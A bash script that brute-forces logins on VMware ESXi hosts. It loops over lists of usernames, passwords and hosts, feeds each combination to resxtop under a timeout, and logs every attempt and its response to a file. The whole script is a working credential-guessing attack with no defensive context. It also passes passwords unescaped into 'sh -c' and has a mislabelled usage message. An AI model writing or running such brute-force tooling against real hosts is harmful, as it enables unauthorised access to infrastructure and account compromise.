#!/bin/bash

# Check if the required command-line arguments are provided
if [ "$#" -ne 3 ]; then
    echo "Usage: $0 <username_file> <password> <hostfile>"
    exit 1
fi

userfile="$1"
passfile="$2"
hostfile="$3"
timeout_seconds=10

# Check if the userfile and hostfile exist
if [ ! -f "$userfile" ]; then
    echo "Userfile not found: $userfile"
    exit 1
fi

if [ ! -f "$hostfile" ]; then
    echo "Hostfile not found: $hostfile"
    exit 1
fi

if [ ! -f "$passfile" ]; then
    echo "Passwords File not found: $password"
    exit 1
fi

# Set LD_LIBRARY_PATH
export LD_LIBRARY_PATH=/usr/lib/vmware/resxtop/

# Save output to a file
output_file="output.txt"
#> "$output_file"  # Clear the file

# run resxtop with a timeout
run_resxtop() {
    local host="$1"
    local user="$2"
    local password="$3"

    command="resxtop -a --server $host"
    timeout "$timeout_seconds" sh -c "echo -e '$user\n$password' | $command"
}

users=($(cat "$userfile"))
passwords=($(cat "$passfile"))
hosts=($(cat "$hostfile"))

# Iterate through all combinations of users, hosts, and passwords
for host in "${hosts[@]}"; do
    for user in "${users[@]}"; do
        for password in "${passwords[@]}"; do
            echo "Running resxtop for $user@$host:$password" >> "$output_file"
            run_resxtop "$host" "$user" "$password" >> "$output_file" 2>&1
        done
    done
done
